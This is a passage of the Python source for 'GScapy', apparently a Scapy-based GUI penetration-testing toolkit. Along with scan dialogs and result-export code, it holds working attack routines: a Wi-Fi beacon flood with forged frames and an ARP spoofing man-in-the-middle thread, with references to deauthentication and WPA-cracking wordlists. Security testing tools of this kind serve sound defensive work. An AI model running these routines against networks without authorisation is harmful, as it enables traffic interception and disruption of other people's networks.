                b'\x00\x0f\xac\x08'  # SAE
                b'\x8c\x00'      # RSN Capabilities (MFPC, MFPR)
            ))
            frame /= rsn_info

        return frame

    def _beacon_flood_thread(self, iface, ssids, bssid, count, interval, enc_type, channel):
        q = self.tool_results_queue
        logging.info(f"Beacon flood started: SSIDs={len(ssids)}, BSSID={bssid}, Count={count}, Enc={enc_type}")

        sent_count = 0
        ssid_index = 0
        infinite_mode = (count == 0)

        try:
            while not self.tool_stop_event.is_set():
                if not infinite_mode and sent_count >= count:
                    break

                current_bssid = RandMAC() if bssid.lower() == 'random' else bssid
                current_ssid = ssids[ssid_index]

                beacon_frame = self._build_beacon_frame(current_ssid, current_bssid, channel, enc_type)

                sendp(beacon_frame, iface=iface, verbose=0)
                sent_count += 1
                ssid_index = (ssid_index + 1) % len(ssids) # Cycle through SSIDs

                status_msg = f"Flooding {current_ssid}... (Packets sent: {sent_count})"
                if not infinite_mode:
                    status_msg += f" / {count}"
                q.put(('bf_status', status_msg))

                time.sleep(interval)

            if self.tool_stop_event.is_set():
                q.put(('bf_status', "Beacon flood canceled."))
            else:
                q.put(('bf_status', "Beacon flood complete."))

        except Exception as e:
            logging.error("Exception in beacon flood thread", exc_info=True)
            q.put(('error', "Beacon Flood Error", str(e)))
        finally:
            q.put(('tool_finished', 'beacon_flood'))
            logging.info("Beacon flood thread finished.")

    def _arp_spoof_thread(self, victim_ip, target_ip):
        q = self.tool_results_queue
        iface = self.get_selected_iface()
        logging.info(f"ARP spoof thread started for Victim={victim_ip}, Target={target_ip}")

        try:
            q.put(('arp_spoof_status', "Resolving MAC addresses..."))
            victim_mac = getmacbyip(victim_ip)
            target_mac = getmacbyip(target_ip)

            if not victim_mac or not target_mac:
                raise Exception("Could not resolve MAC address for one or both targets. Are they online?")

            q.put(('arp_spoof_status', f"Victim: {victim_mac} | Target: {target_mac}"))
            logging.info(f"Resolved MACs -> Victim: {victim_mac}, Target: {target_mac}")

            victim_packet = Ether(dst=victim_mac)/ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=target_ip)
            target_packet = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=victim_ip)

            sent_count = 0
            while not self.tool_stop_event.is_set():
                sendp(victim_packet, iface=iface, verbose=0)
                sendp(target_packet, iface=iface, verbose=0)
                sent_count += 2
                q.put(('arp_spoof_status', f"Spoofing active... (Packets sent: {sent_count})"))
                time.sleep(2)

        except Exception as e:
            logging.error("Exception in ARP spoof thread", exc_info=True)
            q.put(('error', "ARP Spoof Error", str(e)))
        finally:
            q.put(('tool_finished', 'arp_spoof'))
            logging.info("ARP spoof thread finished.")

    def start_arp_spoof(self):
        if self.is_tool_running:
            QMessageBox.warning(self, "Busy", "Another tool is already running.")
            return

        victim_ip = self.arp_spoof_victim_ip.text()
        target_ip = self.arp_spoof_target_ip.text()

        if not victim_ip or not target_ip:
            QMessageBox.critical(self, "Error", "Victim IP and Target IP are required.")
            return

        warning_msg = """
        <p>You are about to perform an ARP Spoofing attack. This will intercept traffic between the two targets and constitutes a Man-in-the-Middle attack.</p>
        <p>Ensure you have <b>explicit, written permission</b> to test on this network. Misuse of this tool is illegal.</p>
        <p><b>Do you accept full responsibility and wish to continue?</b></p>
        """
        if QMessageBox.question(self, "Ethical Use Confirmation", warning_msg, QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No) == QMessageBox.StandardButton.No:
            return

        self.arp_spoof_current_victim = victim_ip
        self.arp_spoof_current_target = target_ip

        self.is_tool_running = True
        self.arp_spoof_start_btn.setEnabled(False)
        self.arp_spoof_stop_btn.setEnabled(True)
        self.tool_stop_event.clear()

        args = (victim_ip, target_ip)
        self.worker = WorkerThread(self._arp_spoof_thread, args=args)
        self.worker.start()

    def stop_arp_spoof(self):
        if self.is_tool_running:
            logging.info("User requested to stop ARP spoofing.")
            self.arp_spoof_status.setText("Stopping...")
            self.tool_stop_event.set()

    def _restore_arp(self, victim_ip, target_ip):
        iface = self.get_selected_iface()
        logging.info(f"Attempting to restore ARP tables for {victim_ip} and {target_ip}")
        try:
            victim_mac = getmacbyip(victim_ip)
            target_mac = getmacbyip(target_ip)

            if not victim_mac or not target_mac:
                raise Exception("Could not resolve MACs for restoration. Manual correction may be needed.")

            # Create the legitimate ARP packets
            restore_victim_packet = Ether(dst=victim_mac)/ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=target_ip, hwsrc=target_mac)
            restore_target_packet = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=victim_ip, hwsrc=victim_mac)

            # Send them multiple times to ensure the cache is corrected
            sendp([restore_victim_packet, restore_target_packet], count=5, inter=0.2, iface=iface, verbose=0)

            logging.info("ARP restoration packets sent.")
            self.arp_spoof_status.setText("ARP tables restored. Attack stopped.")

        except Exception as e:
            logging.error(f"Failed to restore ARP tables: {e}", exc_info=True)
            QMessageBox.critical(self, "Restore Error", f"Could not restore ARP tables: {e}")

    def cancel_tool(self):
        if self.is_tool_running:
            logging.info("User requested to cancel the current tool.")
            self.tool_stop_event.set()

            # Special handling for subprocesses that need to be terminated directly
            # This is more robust than only relying on the thread's check loop.
            with self.thread_finish_lock:
                if hasattr(self, 'nmap_process') and self.nmap_process and self.nmap_process.poll() is None:
                    try:
                        self.nmap_process.terminate()
                        logging.info("Nmap process terminated directly by cancel_tool.")
                    except Exception as e:
                        logging.error(f"Error terminating Nmap process: {e}")

                if hasattr(self, 'sublist3r_process') and self.sublist3r_process and self.sublist3r_process.poll() is None:
                    try:
                        self.sublist3r_process.terminate()
                        logging.info("Sublist3r process terminated directly by cancel_tool.")
                    except Exception as e:
                        logging.error(f"Error terminating Sublist3r process: {e}")

    def _show_port_scan_summary_popup(self, results, target):
        dialog = QDialog(self)
        dialog.setWindowTitle(f"Port Scan Results for {target}")
        dialog.setMinimumSize(400, 300)
        layout = QVBoxLayout(dialog)

        categorized = {"Open": [], "Open | Filtered": [], "Closed": [], "Filtered": [], "Unfiltered (RST)": [], "No Response / Filtered": []}
        for port, state, service in results:
            # Normalize states
            normalized_state = state
            if "No Response" in state:
                normalized_state = "No Response / Filtered"

            if normalized_state in categorized:
                categorized[normalized_state].append(f"{port} ({service})")
            else: # Fallback for any unexpected state
                if "Other" not in categorized: categorized["Other"] = []
                categorized["Other"].append(f"{port} ({state}, {service})")


        text_browser = QTextBrowser()
        text_browser.setOpenExternalLinks(False)
        html = f"<h1>Scan Report: {target}</h1>"
        # Display open ports first
        if categorized["Open"]:
            html += f"<h2>Open Ports ({len(categorized['Open'])})</h2>"
            html += "<ul>" + "".join(f"<li>{p}</li>" for p in sorted(categorized['Open'])) + "</ul>"

        for state, ports in categorized.items():
            if state != "Open" and ports:
                html += f"<h2>{state} ({len(ports)})</h2>"
                html += "<ul>" + "".join(f"<li>{p}</li>" for p in sorted(ports)) + "</ul>"

        text_browser.setHtml(html)
        layout.addWidget(text_browser)

        button_layout = QHBoxLayout()

        analyze_button = QPushButton("Send to AI Analyst")
        analyze_button.clicked.connect(lambda: self._send_to_ai_analyst("port_scanner", results, context=target))
        button_layout.addWidget(analyze_button)

        ok_button = QPushButton("OK")
        ok_button.clicked.connect(dialog.accept)
        button_layout.addWidget(ok_button)
        layout.addLayout(button_layout)

        dialog.exec()

    def _show_arp_scan_summary_popup(self, results, target):
        dialog = QDialog(self)
        dialog.setWindowTitle(f"ARP Scan Results for {target}")
        dialog.setMinimumSize(500, 400)
        layout = QVBoxLayout(dialog)

        summary_label = QLabel(f"<b>Found {len(results)} active hosts on network {target}.</b>")
        layout.addWidget(summary_label)

        tree = QTreeWidget()
        tree.setColumnCount(3)
        tree.setHeaderLabels(["IP Address", "MAC Address", "Vendor"])
        for res in results:
            item = QTreeWidgetItem([res['ip'], res['mac'], res['vendor']])
            tree.addTopLevelItem(item)
        tree.resizeColumnToContents(0)
        tree.resizeColumnToContents(1)
        layout.addWidget(tree)

        export_button = self._create_export_button(tree) # Reuse export functionality
        layout.addWidget(export_button)

        ok_button = QPushButton("OK")
        ok_button.clicked.connect(dialog.accept)
        layout.addWidget(ok_button)

        dialog.exec()

    def _process_tool_results(self):
        """Processes results from worker threads via a queue using a handler dictionary."""
        while not self.tool_results_queue.empty():
            msg = self.tool_results_queue.get()
            msg_type = msg[0]

            # Prioritize exact matches
            if msg_type in self.result_handlers:
                # Unpack arguments; msg[1:] creates a tuple of the remaining elements
                self.result_handlers[msg_type](*msg[1:])
                continue

            # Check for suffix-based dynamic handlers
            matched = False
            for suffix, handler in self.dynamic_handlers.items():
                if msg_type.endswith(suffix):
                    tool_name = msg_type.rsplit(suffix, 1)[0]
                    handler(tool_name, *msg[1:])
                    matched = True
                    break

            if not matched:
                logging.warning(f"No handler found for message type: {msg_type}")

    def _setup_result_handlers(self):
        """Initializes the dictionary mapping result queue messages to handler functions."""
        self.result_handlers = {
            # Exact message matches
            'send_results': self._handle_send_results,
            'send_finished': self._handle_send_finished,
            'tool_finished': self._handle_tool_finished,
            'flood_thread_finished': self._handle_flood_thread_finished,
            'ps_worker_finished': self._handle_ps_worker_finished,
            'crunch_finished': self._handle_crunch_finished,
            'show_port_scan_popup': self._show_port_scan_summary_popup,
            'show_arp_scan_popup': self._show_arp_scan_summary_popup,
            'arp_results': self._handle_arp_results,
            'error': self._handle_error,
        }
        # Handlers for dynamic message types that end with a specific suffix
        self.dynamic_handlers = {
            '_status': self._handle_status_update,
            '_clear': self._handle_clear_update,
            '_result': self._handle_result_update,
            '_update': self._handle_result_update, # Catches 'wifi_scan_update'
        }
        self.result_handlers['nmap_output'] = self._handle_nmap_output
        self.result_handlers['nmap_xml_result'] = self._handle_nmap_xml_result
        self.result_handlers['sublist3r_output'] = self._handle_sublist3r_output
        self.result_handlers['sublist3r_results'] = self._show_subdomain_results_popup

    def _show_subdomain_results_popup(self, domain, subdomains):
        """Shows the results of a subdomain scan in a dedicated dialog."""
        if not subdomains:
            QMessageBox.information(self, "No Results", f"No subdomains were found for {domain}.")
            return
        dialog = SubdomainResultsDialog(subdomains, domain, self)
        dialog.exec()

    def _handle_sublist3r_output(self, line):
        self.sublist3r_output.insertPlainText(line)
        self.sublist3r_output.verticalScrollBar().setValue(self.sublist3r_output.verticalScrollBar().maximum())

    def _handle_nmap_output(self, line):
        self.nmap_output_console.insertPlainText(line)
        self.nmap_output_console.verticalScrollBar().setValue(self.nmap_output_console.verticalScrollBar().maximum())

    def _handle_nmap_xml_result(self, xml_content):
        """Stores the captured Nmap XML report and shows a summary dialog."""
        self.nmap_last_xml = xml_content
        logging.info(f"Captured Nmap XML report ({len(xml_content)} bytes).")
        self.status_bar.showMessage("Nmap scan complete. XML report captured.", 5000)
        self.nmap_report_btn.setEnabled(True)
        self.nmap_ai_analyze_btn.setEnabled(True)

        # Automatically show the summary dialog
        summary_dialog = NmapSummaryDialog(xml_content, self)
        summary_dialog.exec()

    def _handle_send_results(self, ans, unans):
        self.send_results_widget.clear()
        for i, (s, r) in enumerate(ans):
            self.send_results_widget.addTopLevelItem(QTreeWidgetItem([str(i+1), s.summary(), r.summary()]))
        start_num = len(ans)
        for i, s in enumerate(unans):
            self.send_results_widget.addTopLevelItem(QTreeWidgetItem([str(start_num+i+1), s.summary(), "No response"]))

    def _handle_send_finished(self):
        self.send_btn.setEnabled(True)
        self.send_cancel_btn.setEnabled(False)

    def _handle_status_update(self, tool_name, status_text):
        widgets = {'trace': self.trace_status, 'scan': self.scan_status, 'arp': self.arp_status,
                   'flood': self.flood_status, 'fw': self.fw_status, 'wifi_scan': self.wifi_scan_status,
                   'deauth': self.deauth_status, 'arp_spoof': self.arp_spoof_status,
                   'bf': self.bf_status_label, 'ps': self.ps_status_label}
        if tool_name in widgets:
            widgets[tool_name].setText(status_text)

    def _handle_clear_update(self, tool_name):
        widgets = {'trace': self.trace_tree, 'scan': self.scan_tree, 'arp': self.arp_tree,
                   'fw': self.fw_tree, 'wifi_scan': self.wifi_tree}
        if tool_name in widgets:
            widgets[tool_name].clear()

    def _handle_result_update(self, tool_name, result_data):
        widgets = {'trace': self.trace_tree, 'scan': self.scan_tree, 'fw': self.fw_tree,
                   'wifi_scan': self.wifi_tree, 'ps': self.ps_tree}
        if tool_name in widgets:
            widgets[tool_name].addTopLevelItem(QTreeWidgetItem([str(x) for x in result_data]))

    def _handle_arp_results(self, results):
        for res in results:
            self.arp_tree.addTopLevelItem(QTreeWidgetItem([res['ip'], res['mac'], res['status']]))

    def _handle_crunch_finished(self, outfile, returncode):
        if returncode == 0:
            self.wpa_crack_output.appendPlainText(f"Crunch finished successfully. Wordlist saved to:\n{outfile}")
            self.wpa_wordlist_edit.setText(outfile)
        else:
            self.wpa_crack_output.appendPlainText(f"Crunch finished with an error (code: {returncode}). Check gscapy.log for details.")

    def _handle_ps_worker_finished(self, total_threads):
        with self.ps_thread_lock:
            self.ps_finished_threads += 1
            if self.ps_finished_threads >= total_threads:
                if self.tool_stop_event.is_set():
                    self.ps_status_label.setText("Ping sweep canceled.")
                else:
                    self.ps_status_label.setText("Ping sweep complete.")
                self.tool_results_queue.put(('tool_finished', 'ping_sweep'))

    def _handle_flood_thread_finished(self, total_threads):
        with self.thread_finish_lock:
            self.finished_thread_count += 1
            if self.finished_thread_count >= total_threads:
                self.is_tool_running = False
                self.flood_button.setEnabled(True)
                self.stop_flood_button.setEnabled(False)
                if self.tool_stop_event.is_set():
                    self.flood_status.setText("Flood Canceled.")
                else:
                    self.flood_status.setText("Flood complete.")

    def _handle_tool_finished(self, tool):
        self.is_tool_running = False
        buttons = {'traceroute': self.trace_button, 'scanner': self.scan_button, 'arp_scan': self.arp_scan_button,
                   'flooder': self.flood_button, 'fw_tester': self.fw_test_button, 'wifi_scan': self.wifi_scan_button,
                   'deauth': self.deauth_button, 'arp_spoof': self.arp_spoof_start_btn,
                   'beacon_flood': self.bf_start_button, 'ping_sweep': self.ps_start_button, 'nmap_scan': self.nmap_start_btn,
                   'sublist3r_scan': self.sublist3r_start_btn}
        cancel_buttons = {'scanner': self.scan_cancel_button, 'flooder': self.stop_flood_button,
                          'arp_spoof': self.arp_spoof_stop_btn, 'beacon_flood': self.bf_stop_button,
                          'ping_sweep': self.ps_cancel_button, 'fw_tester': self.fw_cancel_button,
                          'traceroute': self.trace_cancel_button, 'wifi_scan': self.wifi_scan_stop_button, 'nmap_scan': self.nmap_cancel_btn,
                          'sublist3r_scan': self.sublist3r_cancel_btn}

        if tool == 'arp_spoof':
            if self.arp_spoof_current_victim and self.arp_spoof_current_target:
                self._restore_arp(self.arp_spoof_current_victim, self.arp_spoof_current_target)
                self.arp_spoof_current_victim = None
                self.arp_spoof_current_target = None

        if tool in buttons:
            buttons[tool].setEnabled(True)
        if tool in cancel_buttons:
            cancel_buttons[tool].setEnabled(False)

        if self.tool_stop_event.is_set():
            status_labels = {'scanner': self.scan_status, 'traceroute': self.trace_status}
            if tool in status_labels:
                status_labels[tool].setText("Canceled by user.")

    def _handle_error(self, title, text):
        QMessageBox.critical(self, title, text)

    def _create_export_button(self, source_widget):
        button = QPushButton("Export Results")
        button.setToolTip("Export the results to a file (CSV, HTML, PDF, DOCX).")
        button.clicked.connect(lambda: self._handle_export(source_widget))
        return button

    def _handle_export(self, source_widget):
        if source_widget.topLevelItemCount() == 0:
            QMessageBox.information(self, "No Data", "There is no data to export.")
            return

        formats = "HTML (*.html);;CSV (*.csv);;PDF (*.pdf);;Word Document (*.docx)"
        file_path, selected_format = QFileDialog.getSaveFileName(self, "Export Results", "", formats)

        if not file_path:
            return

        try:
            if 'html' in selected_format:
                self._export_to_html(source_widget, file_path)
            elif 'csv' in selected_format:
                self._export_to_csv(source_widget, file_path)
            elif 'pdf' in selected_format:
                self._export_to_pdf(source_widget, file_path)
            elif 'docx' in selected_format:
                self._export_to_docx(source_widget, file_path)
            else:
                QMessageBox.warning(self, "Unsupported Format", "Selected file format is not supported.")
                return
            self.status_bar.showMessage(f"Successfully exported results to {file_path}")
        except NameError:
            logging.error("Export failed due to missing optional dependencies.", exc_info=True)
            QMessageBox.critical(self, "Dependency Error", "Optional libraries for PDF/DOCX export are not installed.\nPlease run: pip install reportlab python-docx")
        except Exception as e:
            logging.error(f"Failed to export results: {e}", exc_info=True)
            QMessageBox.critical(self, "Export Error", f"An error occurred during export:\n{e}")

    def _export_to_csv(self, tree_widget, file_path):
        with open(file_path, 'w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            header = [tree_widget.headerItem().text(i) for i in range(tree_widget.columnCount())]
            writer.writerow(header)
            for i in range(tree_widget.topLevelItemCount()):
                item = tree_widget.topLevelItem(i)
                row = [item.text(j) for j in range(tree_widget.columnCount())]
                writer.writerow(row)

    def _export_to_html(self, tree_widget, file_path):
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write("<html><head><title>Exported Results</title>")
            f.write("<style>body { font-family: sans-serif; } table { border-collapse: collapse; width: 100%; }")
            f.write("th, td { border: 1px solid #dddddd; text-align: left; padding: 8px; }")
            f.write("tr:nth-child(even) { background-color: #f2f2f2; }</style></head><body>")
            f.write("<h2>Exported Results</h2><table><tr>")
            header = [tree_widget.headerItem().text(i) for i in range(tree_widget.columnCount())]
            for h in header:
                f.write(f"<th>{h}</th>")
            f.write("</tr>")
            for i in range(tree_widget.topLevelItemCount()):
                f.write("<tr>")
                item = tree_widget.topLevelItem(i)
                for j in range(tree_widget.columnCount()):
                    f.write(f"<td>{item.text(j)}</td>")
                f.write("</tr>")
            f.write("</table></body></html>")

    def _export_to_pdf(self, tree_widget, file_path):
        doc = SimpleDocTemplate(file_path)
        elements = []
        styles = getSampleStyleSheet()
        elements.append(Paragraph("GScapy Exported Results", styles['h1']))

        header = [tree_widget.headerItem().text(i) for i in range(tree_widget.columnCount())]
        data = [header]
        for i in range(tree_widget.topLevelItemCount()):
            row = [tree_widget.topLevelItem(i).text(j) for j in range(tree_widget.columnCount())]
            data.append(row)

        table = Table(data)
        style = TableStyle([
            ('BACKGROUND', (0,0), (-1,0), colors.grey),
            ('TEXTCOLOR',(0,0),(-1,0),colors.whitesmoke),
            ('ALIGN', (0,0), (-1,-1), 'CENTER'),
            ('FONTNAME', (0,0), (-1,0), 'Helvetica-Bold'),
            ('BOTTOMPADDING', (0,0), (-1,0), 12),
            ('BACKGROUND', (0,1), (-1,-1), colors.beige),
            ('GRID', (0,0), (-1,-1), 1, colors.black)
        ])
        table.setStyle(style)
        elements.append(table)
        doc.build(elements)

    def _export_to_docx(self, tree_widget, file_path):
        document = docx.Document()
        document.add_heading('GScapy Exported Results', 0)

        header = [tree_widget.headerItem().text(i) for i in range(tree_widget.columnCount())]

        table = document.add_table(rows=1, cols=len(header))
        table.style = 'Light Shading Accent 1'
        hdr_cells = table.rows[0].cells
        for i, h in enumerate(header):
            hdr_cells[i].text = h

        for i in range(tree_widget.topLevelItemCount()):
            row_cells = table.add_row().cells
            item = tree_widget.topLevelItem(i)
            for j in range(tree_widget.columnCount()):
                row_cells[j].text = item.text(j)

        document.save(file_path)

    def _update_arp_target(self):
        """Automatically updates the ARP Scan target field based on the selected interface."""
        iface_name = self.get_selected_iface()
        if not hasattr(self, 'arp_target'): return # Don't run if the widget doesn't exist yet

        if not iface_name or iface_name == "Automatic":
            # Fallback for automatic or unselected interface
            self.arp_target.setText("192.168.1.0/24")
            return

        try:
            addrs = psutil.net_if_addrs().get(iface_name, [])
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    ip = addr.address
                    netmask = addr.netmask
                    if ip and netmask:
                        # Use ipaddress module to calculate network CIDR
                        host_iface = ipaddress.IPv4Interface(f"{ip}/{netmask}")
                        network_cidr = host_iface.network.with_prefixlen
                        self.arp_target.setText(network_cidr)
                        logging.info(f"Updated ARP target for interface {iface_name} to {network_cidr}")
                        return
        except Exception as e:
            logging.error(f"Could not auto-populate ARP target for {iface_name}: {e}")
            self.arp_target.setText("192.168.1.0/24") # Fallback on error

    def closeEvent(self, event):
        """Shows a confirmation dialog and ensures background threads are stopped on exit."""
        reply = QMessageBox.question(self, 'Exit Confirmation',
                                     "Are you sure you want to exit?",
                                     QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
                                     QMessageBox.StandardButton.No)

        if reply == QMessageBox.StandardButton.Yes:
            logging.info("User confirmed exit. Stopping background threads.")
            if self.sniffer_thread and self.sniffer_thread.isRunning(): self.sniffer_thread.stop()
            if self.channel_hopper and self.channel_hopper.isRunning(): self.channel_hopper.stop()
            if self.resource_monitor_thread and self.resource_monitor_thread.isRunning():
                self.resource_monitor_thread.stop()
            logging.info("GScapy application closing.")
            event.accept()
        else:
            logging.info("User canceled exit.")
            event.ignore()

def main():
    """Main function to launch the GScapy application."""
    try:
        if 'scapy' not in sys.modules: raise ImportError
        app = QApplication(sys.argv)
        apply_stylesheet(app, theme='dark_teal.xml')
        window = GScapy()
        window.show()
        sys.exit(app.exec())
    except ImportError:
        app = QApplication(sys.argv); QMessageBox.critical(None, "Fatal Error", "Scapy is not installed."); sys.exit(1)
    except Exception as e:
        logging.critical(f"An unhandled exception occurred: {e}", exc_info=True)
        app = QApplication(sys.argv); QMessageBox.critical(None, "Unhandled Exception", f"An unexpected error occurred:\n\n{e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
